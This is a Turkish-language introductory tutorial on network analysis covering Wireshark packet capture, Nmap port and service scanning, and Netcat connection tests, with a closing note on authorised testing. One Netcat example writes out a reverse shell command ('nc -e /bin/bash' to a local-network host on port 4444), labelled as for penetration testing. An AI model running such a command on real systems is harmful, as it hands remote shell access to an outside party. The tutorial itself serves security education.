## 📡 Ağları İnceleme (Network Analysis)
Ağları incelemek, ağ trafiğini izlemek, analiz etmek ve güvenlik açıklarını tespit etmek için kullanılan bir süreçtir. Siber güvenlik, penetrasyon testleri ve sistem yönetimi için kritik bir adımdır.

### 📌 1️⃣ Ağ İnceleme Yöntemleri
Ağ analizi için farklı teknikler ve araçlar kullanılır. İşte en yaygın yöntemler:

#### 🔹 1. Pasif Ağ Analizi
Ağa müdahale etmeden sadece trafiği dinleyerek analiz yapma işlemidir. Sniffing (Paket Dinleme) yöntemi ile ağdan geçen veriler incelenir.
- **Araçlar:** Wireshark, tcpdump, Tshark, Ettercap
- **✅ Kullanım Alanları:**
  - Ağ trafiğini izleme
  - Anormal veri akışlarını tespit etme
  - Olası saldırıları analiz etme

#### 🔹 2. Aktif Ağ Analizi
Ağa doğrudan müdahale ederek testler yapma işlemidir. Paket enjeksiyonu, tarama ve pentest teknikleri kullanılır.
- **Araçlar:** Nmap, Netcat, Scapy, Nessus
- **✅ Kullanım Alanları:**
  - Açık portları ve servisleri tespit etme
  - Zafiyet tarama ve güvenlik testi yapma
  - Ağ güvenlik politikalarını denetleme

### 📌 2️⃣ Kullanılan Araçlar ve Teknikler

#### 🔍 1. Wireshark (Paket Analizi)
Wireshark, ağ trafiğini yakalayıp analiz etmek için kullanılan en popüler araçlardan biridir.
##### Linux'ta Kurulum:
```bash
sudo apt install wireshark -y
```
##### Ağ Trafiği Dinleme:
```bash
sudo wireshark
```
Wireshark ile HTTP, DNS, TCP, UDP, ICMP paketlerini analiz edebilirsin.

#### 🔍 2. Nmap (Ağ Tarama ve Keşif)
Nmap, ağ haritası çıkarmak, açık portları bulmak ve sistem bilgilerini toplamak için kullanılan bir araçtır.
##### Linux'ta Kurulum:
```bash
sudo apt install nmap -y
```
##### Ağ Tarama Örnekleri:
- **📌 Tüm açık portları tarama:**
  ```bash
  nmap -p- 192.168.1.1
  ```
- **📌 Ağ üzerindeki cihazları listeleme:**
  ```bash
  nmap -sn 192.168.1.0/24
  ```
- **📌 Hedef sistemde çalışan servisleri tespit etme:**
  ```bash
  nmap -sV 192.168.1.1
  ```

#### 🔍 3. Netcat (Ağ Bağlantı Testi ve Reverse Shell)
Netcat, ağ üzerindeki bağlantıları test etmek ve veri alışverişi yapmak için kullanılır.
- **📌 Hedef sistemin açık olup olmadığını kontrol etme:**
  ```bash
  nc -zv 192.168.1.1 80
  ```
- **📌 Hedef sisteme dosya gönderme:**
  ```bash
  nc 192.168.1.1 4444 < dosya.txt
  ```
- **📌 Reverse Shell oluşturma (Pentest amaçlı):**
  ```bash
  nc -e /bin/bash 192.168.1.100 4444
  ```

### 📌 3️⃣ Ağ Analizi Yaparken Dikkat Edilmesi Gerekenler
🔴 **Etik Kurallar:** Kendi iznin olmayan ağları taramak yasal değildir.
🟢 **Güvenlik Testleri:** Ağ güvenliği testleri için izinli ortamlarda çalışmalısın.
🔴 **Veri Gizliliği:** Ağdaki kullanıcıların kişisel bilgilerini saklamamak ve paylaşmamak gerekir.

### 📌 Özet
✅ **Ağ analizi**, ağın güvenliğini test etmek ve sorunları tespit etmek için kullanılır.
✅ **Wireshark →** Trafik izleme ve analiz
✅ **Nmap →** Açık portları ve ağ cihazlarını tespit etme
✅ **Netcat →** Bağlantı testleri ve veri transferi
✅ **Airodump-ng →** Kablosuz ağları analiz etme
